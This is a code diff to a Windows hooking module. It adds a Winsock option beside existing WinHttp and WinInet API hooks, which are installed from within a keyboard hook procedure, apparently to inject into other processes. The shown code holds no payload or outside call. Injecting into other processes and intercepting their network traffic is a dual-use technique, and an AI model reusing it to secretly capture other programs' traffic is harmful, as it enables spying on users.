@@ -5,10 +5,13 @@
 //begin
 //#define _USE_WINHTTP_
 //#define _USE_WININET_
+#define _USE_WINSOCK_
 #ifdef _USE_WINHTTP_
 #include "WinHttpHook.h"
 #elif defined(_USE_WININET_)
 #include "WinInetHook.h"
+#elif defined(_USE_WINSOCK_)
+#include "WsHook.h"
 #else
 #include "WinHttpHook.h"
 #include "WinInetHook.h"
@@ -29,6 +32,7 @@ HINSTANCE g_hInstance = NULL;
 HHOOK g_hKbHook;
 BOOL g_bWinHttpApiHook = FALSE;
 BOOL g_bWinInetApiHook = FALSE;
+BOOL g_bWinSockApiHook = FALSE;
 
 ///////////////////
 // log
@@ -100,6 +104,12 @@ LRESULT CALLBACK KbHookProc(int nCode, WPARAM wParam, LPARAM lParam)
 		WriteAGLog("WinInetInstallHooks");
 		g_bWinInetApiHook = WinInetInstallHooks();
 	}
+#elif defined(_USE_WINSOCK_)
+	if (g_bWinSockApiHook==FALSE)
+	{
+		WriteAGLog("WinsockInstallHooks");
+		g_bWinSockApiHook = WinsockInstallHooks();
+	}
 #else
 	if (g_bWinHttpApiHook == FALSE)
 	{
@@ -134,6 +144,8 @@ BOOL DisableKeyboardCapture()
 	WinHttpRemoveHooks();
 #elif defined(_USE_WININET_)
 	WinInetRemoveHooks();
+#elif defined(_USE_WINSOCK_)
+	WinsockRemoveHooks();
 #else
 	WinHttpRemoveHooks();
 	WinInetRemoveHooks();
